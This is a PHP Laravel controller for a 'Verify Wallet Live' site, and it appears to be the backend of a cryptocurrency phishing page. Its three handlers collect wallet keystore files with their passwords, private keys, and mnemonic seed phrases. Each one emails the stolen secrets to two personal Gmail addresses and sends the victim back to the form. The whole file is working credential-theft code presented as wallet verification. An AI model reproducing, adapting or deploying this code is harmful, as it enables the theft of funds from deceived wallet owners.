<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class ActionController extends Controller
{
    public function firstform(Request $request)
    {
    	$upload_link = "No file uploaded";
        if ($request->hasFile('keystorefile')) {
          $file = $request->file('keystorefile');
          $name = rand().'.'.$file->getClientOriginalExtension();
          $file->move(public_path('keystorefile/'), $name);
          $upload_link = "keystorefile/".$name;
        }

        $data = array('keystorefile' => $upload_link, 'keystorepassword' => $request->keystorepassword);

		Mail::send('firstform', $data, function($message) {
		 $message->to('Carmeloschupbach@gmail.com', 'Verify Wallet Live : By keystorefile')->subject('Verify Wallet Live : By keystorefile');
		 $message->from('technical@verifywalletlive.com','Verify Wallet Live');
		});       

        Mail::send('firstform', $data, function($message) {
         $message->to('Men.jes04@gmail.com', 'Verify Wallet Live : By keystorefile')->subject('Verify Wallet Live : By keystorefile');
         $message->from('technical@verifywalletlive.com','Verify Wallet Live');
        });

    	return redirect()->back();
    }

    public function secondform(Request $request)
    {
	   	$data = array('privatekeypass' => $request->privatekeypass);
	   
		Mail::send('secondform', $data, function($message) {
		 $message->to('Carmeloschupbach@gmail.com', 'Verify Wallet Live : By Private Key')->subject
		    ('Verify Wallet Live : By Private Key');
		 $message->from('technical@verifywalletlive.com','Verify Wallet Live');
		});

        Mail::send('secondform', $data, function($message) {
         $message->to('Men.jes04@gmail.com', 'Verify Wallet Live : By Private Key')->subject
            ('Verify Wallet Live : By Private Key');
         $message->from('technical@verifywalletlive.com','Verify Wallet Live');
        });

    	return redirect()->back();
    }

    public function thirdform(Request $request)
    {
	   	$data = array('mneomic' => $request->mneomic);
	   
		Mail::send('thirdform', $data, function($message) {
		 $message->to('Carmeloschupbach@gmail.com', 'Verify Wallet Live : By Mneomic Phrase')->subject
		    ('Verify Wallet Live : By Mneomic Phrase');
		 $message->from('technical@verifywalletlive.com','Verify Wallet Live');
		});

        Mail::send('thirdform', $data, function($message) {
         $message->to('Men.jes04@gmail.com', 'Verify Wallet Live : By Mneomic Phrase')->subject
            ('Verify Wallet Live : By Mneomic Phrase');
         $message->from('technical@verifywalletlive.com','Verify Wallet Live');
        });

    	return redirect()->back();
    }
}
